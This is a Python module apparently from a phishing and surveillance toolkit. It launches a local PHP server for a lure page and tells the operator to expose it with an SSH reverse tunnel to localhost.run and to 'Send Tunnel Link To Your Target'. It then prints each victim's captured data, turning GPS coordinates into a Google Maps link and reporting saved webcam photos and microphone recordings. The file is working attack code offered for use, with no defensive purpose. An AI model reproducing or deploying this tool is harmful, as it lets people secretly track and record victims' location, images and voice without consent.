import random
import subprocess
from module.colors import c
from module.messages import show_message
import os
from time import sleep
import json

#GET RANDOM PORT
randPort = random.choice(range(1000,9000))
# Function For After User Open Url
def After_click(dir_path,message):
    sleep(5)
    file_size = 0
    if os.stat(f"template/{dir_path}").st_size != file_size:
            data = open(f"template/{dir_path}","r").read()
            data_decode = json.loads(data)
            for i in data_decode:
                if data_decode[i] == None:
                            data_decode[i] = "None" 
                print(c.grey+ " "+i.replace("-"," ")+c.green+" : "+c.red+data_decode[i])
                with open(f"template/{dir_path}","w+") as file :
                    file.write("")          
            show_message(message)  
 
    else:  
      pass    
 
           
 
#Function for After User Acess Permision
def Before_click(template,before_click_focus):
            sleep(5)
            file_size = 0
     #   try:

            if os.stat(f"template/{template}").st_size != file_size:

                if before_click_focus == "location":
                    
                    data = open(f"template/{template}","r").read()
                    location_file_json_decode = json.loads(data)
                    print(c.re+"\n Google Map Link : "+c.green+f"https://www.google.com/maps/place/{location_file_json_decode['lat']}+{location_file_json_decode['lon']}")

                   # result = continue_proc(
         #               con_path=template,
                #        con_status=before_click_status
   #                 )  
       #             return result                   
                
                elif before_click_focus == "webcam":
                    data = open(f"template/{template}","r").read()
                    webcam_file_json_decode = json.loads(data)
                    print(c.re+"\n Image "+c.green+f"{webcam_file_json_decode['File-Name']} Saved > Please Check /images Folder ")
                            

     ##              result = continue_proc(
      #                 con_path=before_click_template_name,
                       # con_status=before_click_status
         #           )  
         #           return result

                
                elif before_click_focus == "microphone":
                    data = open(f"template/{template}","r").read()
                    microphone_file_json_decode = json.loads(data)
                    print(c.re+"\n Voice "+c.green+f"{microphone_file_json_decode['File-Name']} Saved > Please Check /sounds Folder ")
                    
            with open(f"template/{template}","w") as file:
              file.write("")
                      

         #           result = continue_proc(
             #           con_path=before_click_template_name,
                    #    con_status=before_click_status
    #                )  
                #    return result


    #    except Exception as Ex:
         #   exit(Ex)
           


# Function For Run Local host || kill Php Process
def run_php_server(port,dir_name):
  with open(f"log/{dir_name}-php.log","w+") as php_log: 
       args =("php","-S",f"localhost:{randPort}","-t",f"template/{dir_name}")
       proc_info = subprocess.Popen(args,stderr=php_log,stdout=php_log).pid
       
       
  print(c.red+"[ ● ] "+c.green+"Link : "+c.cyan+f"http://127.0.0.1:{randPort}\n"+c.red+"[*] "+c.yellow+"Please open a new Terminal And Run This command.\n"+c.red+"[*]"+c.green+f" Command =>"+c.grey+f" ssh -R 80:127.0.0.1:{randPort} nokey@localhost.run\n"+c.red+"[*]"+c.green+" Then Send Tunnel Link To Your Target !!!\n ")
 
def kill():
    subprocess.getoutput("killall -9 php")
    
